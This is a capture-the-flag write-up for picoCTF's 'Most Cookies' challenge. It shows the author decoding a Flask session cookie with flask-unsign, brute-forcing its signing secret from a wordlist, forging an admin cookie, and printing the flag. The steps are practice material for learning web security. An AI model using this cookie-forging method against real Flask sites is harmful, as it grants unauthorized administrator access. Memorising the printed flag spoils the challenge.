# PicoGym Web Exploitation Writeup


Author: [Ankur Kumar](https://github.com/awsoankur) 

Challenge Page: [Most Cookies](http://mercury.picoctf.net:35697/)

## Walkthrough
upon a lot of researching of flask session cookies and a way to bypass them
i downloaded these `flask-unsign` tools which seemed to come in handy.
i used them to decode the current flask cookie with the command:
`flask-unsign --decode --cookie eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YL_N3g.cWbIRgxgPDs6wrEmtVJiMl43e_U`.
which gave the output as `{'very_auth': 'snickerdoodle'}`
upon examining the server.py file the solution to the problem was to find out
 a cookie with the value `{'very_auth': 'admin'}`.
now to find the secret key we brute force each possible key with the cookie 
using the following command.
`flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YL_N3g.cWbIRgxgPDs6wrEmtVJiMl43e_U --wordlist wordlist.txt`.
for this command we need to make a file(wordlist.txt) with all the cookie names 
from the server python code.
the code should return the secret code , which in my case was `peanut butter`.
now we need to sign the required cookie with this key using the command as follows.
`flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret 'peanut butter'`
this gives the cookie .
`eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YL_R1Q.ek1C_wS4Oz-AhazR7Kk6DXhZRsU`
change the cookie value to this and refreh page to get the flag



## Flag
`picoCTF{pwn_4ll_th3_cook1E5_22fe0842}`
